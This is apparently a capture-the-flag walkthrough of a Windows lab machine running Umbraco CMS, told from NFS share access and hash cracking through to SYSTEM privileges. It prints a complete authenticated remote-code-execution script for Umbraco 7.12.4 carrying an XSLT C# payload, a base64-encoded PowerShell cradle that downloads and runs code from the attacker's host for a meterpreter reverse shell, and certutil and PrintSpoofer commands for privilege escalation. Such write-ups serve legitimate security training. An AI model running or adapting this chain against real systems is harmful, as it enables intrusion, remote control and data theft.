
# CTF Writeup: Remote

---
## Reconnaissance

An initial scan revealed the following information about the running services on the target system.

```
nmap -n -Pn -sS -p- 10.129.230.172
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-15 12:22 -0500
Nmap scan report for 10.129.230.172
Host is up (0.036s latency).
Not shown: 65519 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49678/tcp open  unknown
49679/tcp open  unknown
49680/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 25.19 seconds
```

Another more detailled scan provided information about detailled information about the running services.

```
nmap -n -Pn -sSCV -p 21,80,111,135,139,445,2049,5985,47001,49664,49665,49666,49667,49678,49679,49680 10.129.33.124
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-15 12:27 -0500
Nmap scan report for 10.129.33.124
Host is up (0.029s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-07-15T18:28:08
|_  start_date: N/A
|_clock-skew: 59m56s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.06 seconds
```

The initial nmap scan revealed important information about ftp being anonymously accessible. Unfortunately this access didn't provide anything useful for now. I moved onto the webserver and found hints to an running "umbraco" CMS. I decided to verify it, by enumerating endpoints. I'll utilize "feroxbuster" as tool for this job.

```
feroxbuster --url http://10.129.33.124
```

I was able to identify the Umbraco CMS Endpoint. But since I don't have any credentials I couldn't proceed. I decided to move onto port 2049, which represents NFS "Network File Share" which was designed for Linux/Unix file shares. It enables to mount whole directories onto your local machine.
We utilized the tool "showmount" for this procedure and found out that we can actually mount an directory called "/site_backups".

```
showmount -e 10.129.33.124
Export list for 10.129.33.124:
/site_backups (everyone)
```

I created an directory called /site_backups on my local machine.

```
mkdir site_backups
```

Mounted the remote directory from the target onto my local machine.

```
mount -t nfs 10.129.33.124:/site_backups /ctfs/htb/windows/remote/site_backups
```

Displayed all the downloaded content.

```
ls -la
total 123
drwx------ 2 nobody nogroup  4096 Feb 23  2020 .
drwxrwxr-x 3 root   root     4096 Jul 15 12:44 ..
drwx------ 2 nobody nogroup    64 Feb 20  2020 App_Browsers
drwx------ 2 nobody nogroup  4096 Feb 20  2020 App_Data
drwx------ 2 nobody nogroup  4096 Feb 20  2020 App_Plugins
drwx------ 2 nobody nogroup    64 Feb 20  2020 aspnet_client
drwx------ 2 nobody nogroup 49152 Feb 20  2020 bin
drwx------ 2 nobody nogroup  8192 Feb 20  2020 Config
drwx------ 2 nobody nogroup    64 Feb 20  2020 css
-rwx------ 1 nobody nogroup   152 Nov  1  2018 default.aspx
-rwx------ 1 nobody nogroup    89 Nov  1  2018 Global.asax
drwx------ 2 nobody nogroup  4096 Feb 20  2020 Media
drwx------ 2 nobody nogroup    64 Feb 20  2020 scripts
drwx------ 2 nobody nogroup  8192 Feb 20  2020 Umbraco
drwx------ 2 nobody nogroup  4096 Feb 20  2020 Umbraco_Client
drwx------ 2 nobody nogroup  4096 Feb 20  2020 Views
-rwx------ 1 nobody nogroup 28539 Feb 19  2020 Web.config
```

I viewed the file which is storing passwords and gained information about multiple existings users.

```
strings Umbraco.sdf | grep password
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "smith" <smith@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "ssmith" <ssmith@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
passwordConfig
```

I then grep'd for admin and retrieved password hashes encoded in SHA-1 which is very weak, let's try & crack it.

```
strings Umbraco.sdf | grep admin
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
```

I utilized crackstation.net to crack the first hash and retrieved an password for the "admin" account of the Umbraco CMS.

```
admin@htb.local:baconandcheese
```

I found out that the Umbraco CMS Version is 7.12.4 and searched for public exploits on in TI Databases using an tool called "searchsploit".

```
searchsploit umbraco 7.12.4
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                          | aspx/webapps/46153.py
Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)                          | aspx/webapps/49488.py
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Started up an python webserver in which my nc.exe is stored.

```
python3 -m http.server 80
```

Added the following payload into the exploit.

```
"""<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">
<msxsl:script language="C#" implements-prefix="csharp_user">
public string xml() { 
    string cmd = "wget 10.10.15.9/shell.exe"; 
    System.Diagnostics.Process proc = new System.Diagnostics.Process();
    proc.StartInfo.FileName = "powershell.exe"; 
    proc.StartInfo.Arguments = cmd;
    proc.StartInfo.UseShellExecute = false; 
    proc.StartInfo.RedirectStandardOutput = true;
    proc.Start(); 
    string output = proc.StandardOutput.ReadToEnd(); 
    return output; 
} 
</msxsl:script>
<xsl:template match="/"> 
    <xsl:value-of select="csharp_user:xml()"/>
</xsl:template> 
</xsl:stylesheet>"""
```

Ran the exploit. Verified that it really downloaded the shell.exe to the target.
But for some odd reasons it didn't let me do basic path selection of the file. I'm assuming write perms were restricted in Standard Paths like C:\Windows\Temp. I utilized metasploit to generate an encoded powershell reverse shell.

```
msfconsole
use exploit/multi/script/web_delivery
set RHOSTS <ip>
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set target 2
run
```

```
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABmADQAWABrAHUAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAZgA0AFgAawB1AC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAZgA0AFgAawB1AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA1AC4AOQA6ADgAMAA4ADAALwA1AEsAawB0AHMAegB5AG0AbwBVAC8AOABtAGYAdQBwAEsAYwBEAGkAbABVAHoAZQBxACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADUALgA5ADoAOAAwADgAMAAvADUASwBrAHQAcwB6AHkAbQBvAFUAJwApACkAOwA=
```

Added this script to my exploit script in the "cmd" parameter.

```
import requests
from bs4 import BeautifulSoup

def print_dict(dico):
    print(dico.items())

print("Start")

# FIXED: Using a clean triple-quoted string for the XML payload
payload = """<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">
<msxsl:script language="C#" implements-prefix="csharp_user">
public string xml() { 
    string cmd = "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABmADQAWABrAHUAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAZgA0AFgAawB1AC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAZgA0AFgAawB1AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA1AC4AOQA6ADgAMAA4ADAALwA1AEsAawB0AHMAegB5AG0AbwBVAC8AOABtAGYAdQBwAEsAYwBEAGkAbABVAHoAZQBxACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADUALgA5ADoAOAAwADgAMAAvADUASwBrAHQAcwB6AHkAbQBvAFUAJwApACkAOwA="; 
    System.Diagnostics.Process proc = new System.Diagnostics.Process();
    proc.StartInfo.FileName = "powershell.exe"; 
    proc.StartInfo.Arguments = cmd;
    proc.StartInfo.UseShellExecute = false; 
    proc.StartInfo.RedirectStandardOutput = true;
    proc.Start(); 
    string output = proc.StandardOutput.ReadToEnd(); 
    return output; 
} 
</msxsl:script>
<xsl:template match="/"> 
    <xsl:value-of select="csharp_user:xml()"/>
</xsl:template> 
</xsl:stylesheet>"""

login = "admin@htb.local"
password = "baconandcheese"
host = "http://10.129.33.124"

# Step 1 - Get Main page
s = requests.session()
url_main = host + "/umbraco/"
r1 = s.get(url_main)
print_dict(r1.cookies)

# Step 2 - Process Login
url_login = host + "/umbraco/backoffice/UmbracoApi/Authentication/PostLogin"
loginfo = {"username": login, "password": password}
r2 = s.post(url_login, json=loginfo)

# Step 3 - Go to vulnerable web page
url_xslt = host + "/umbraco/developer/Xslt/xsltVisualize.aspx"
r3 = s.get(url_xslt)

soup = BeautifulSoup(r3.text, 'html.parser')
VIEWSTATE = soup.find(id="__VIEWSTATE")['value']
VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value']
UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN']
headers = {'UMB-XSRF-TOKEN': UMBXSRFTOKEN}
data = {
    "__EVENTTARGET": "",
    "__EVENTARGUMENT": "",
    "__VIEWSTATE": VIEWSTATE,
    "__VIEWSTATEGENERATOR": VIEWSTATEGENERATOR,
    "ctl00$body$xsltSelection": payload,
    "ctl00$body$contentPicker$ContentIdValue": "",
    "ctl00$body$visualizeDo": "Visualize+XSLT"
}

# Step 4 - Launch the attack
r4 = s.post(url_xslt, data=data, headers=headers)

print("End")

```

Ran the exploit and gained an shell on my meterpreter listener.

Retrieved user.txt in C:\Users\Public\Desktop.

```
600f58b83c0f6925a37ba53fbb8b684a
```

## Privilege Escalation

Enumerated Privileges and found the "SeImpersonatePrivilege" open.

```
whoami /priv
```

Downloaded PrintSpoofer.exe onto the target system.

```
certutil -urlcache -split -f http://10.10.15.9/PrintSpoofer.exe PrintSpoofer.exe
```

Ran it & gained NT AUTHORITY\SYSTEM rights.

```
PrintSpoofer.exe -i -c cmd.exe
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
5b4d1b7c010f326f40a3ccf7d494c714
```
